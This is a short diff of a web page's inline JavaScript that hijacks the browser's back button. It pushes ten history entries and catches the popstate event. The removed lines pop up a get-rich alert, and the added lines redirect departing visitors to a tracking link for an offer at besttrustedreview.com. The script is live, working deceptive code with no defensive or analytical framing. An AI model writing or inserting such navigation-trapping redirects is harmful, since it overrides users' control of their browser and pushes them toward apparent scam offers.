@@ -92,21 +92,15 @@ $(function(){
 <script src="js/script.js"></script>
 
 <script type="text/javascript">
-    !function () {
-        var count = 1;
+    ! function() {
         var t;
         try {
-            for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
-            onpopstate = function (t) {
-                if(count%2 == 1) {
-                    alert('You Can Make $1,620 A Day!')
-
+            for(t = 0; 10 > t; ++t) history.pushState({}, "", "");
+                onpopstate = function(t) {
+                PreventExitPop = false
+                t.state && location.replace("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3")
                 }
-                count++;
-                t.state && location.replace("#")
-            }
-        } catch (o) {
-        }
+        } catch(o) {}
     }();
 </script>
 
